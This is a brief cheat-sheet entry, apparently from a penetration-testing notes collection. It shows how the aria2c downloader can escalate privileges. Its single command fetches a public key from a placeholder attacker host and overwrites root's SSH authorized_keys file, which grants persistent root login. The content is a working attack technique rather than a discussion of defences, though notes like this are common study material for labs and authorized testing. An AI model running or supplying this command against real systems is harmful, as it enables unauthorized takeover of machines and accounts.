# aria2c

Example to privilege escalation when you are able to download & overwrite existing file

`/usr/bin/aria2c -d /root/.ssh/ -o authorized_keys "http://<ATTACKER_IP>/id_rsa.pub" --allow-overwrite=true`